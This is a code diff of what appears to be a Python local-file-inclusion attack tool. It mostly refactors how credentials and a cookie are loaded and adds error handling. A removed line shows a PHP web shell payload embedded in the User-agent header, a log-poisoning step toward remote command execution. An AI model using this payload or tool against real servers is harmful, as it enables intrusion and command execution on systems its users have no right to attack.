@@ -16,20 +16,21 @@ path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')
 class Local_File_In:
 
         def __init__(self,**kwargs) :          
-            if self.args.readuser:
-                 with open(self.args.readuser,'r') as username:
-                      self.args.user = username.read().replace('/n','')
-            if self.args.readpass:
-                 with open(self.args.readpass,'r') as password:
-                      self.args.password = password.read().replace('/n','')  
+            try: 
+                with open(self .args.readuser,'r') as username:
+                        self.args.user = username.read().replace('/n','')  
+            except TypeError:
+                    pass         
+            if self.args.readpass or self.args.config:
+                try:
+                    with open(self.args.readpass,'r') as password:
+                       self.args.password = password.read().replace('/n','')
+                except TypeError:
+                    pass      
             try:   
-                if self.args.Cookie and not self.args.config:
+                if self.args.Cookie  or self.args.config:
                    with open(self.args.Cookie,'r') as Cookie_file :
-                      self.Cookie =  Cookie_file.read()
-                else:
-                    config = configparser.ConfigParser()
-                    config.read(self.args.config) 
-                    self.Cookie = config['DEFAULT']['cookie']    
+                      self.Cookie =  Cookie_file.read()  
             except Exception as e :
                    print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                    print("[*] Error : ",e )
@@ -188,7 +189,7 @@ class Local_File_In:
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
                     request.set_handle_refresh(True, max_time=1)              
-                    request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?> (X11; U; Linux i686; en-US; rv:1.9.0.1)\
+                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                  Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                  ('username',f'{self.args.user}'),
                                  ('password',f'{self.args.password}'),
@@ -323,8 +324,12 @@ class Local_File_In:
                    print("[*] try to use PHP Filter bu useing -B64/--base64 ")  
                 exit()                   
         def file_name (self,**kwargs):
-          self.args.read = "-".join(str("".join(re.findall('=.+',self.url))).split("/")[-2:])
-          with open (".RQData",'w')as RQ :
-             RQ.write(str(self._first_req))
+            self.args.read = "-".join(str("".join(re.findall('=.+',self.url))).split("/")[-2:])
+            try:
+                with open (".RQData",'w')as RQ :
+                    RQ.write(str(self._first_req))
+            except AttributeError:
+                pass        
+
 if __name__=='__main__':
      Local_File_In()
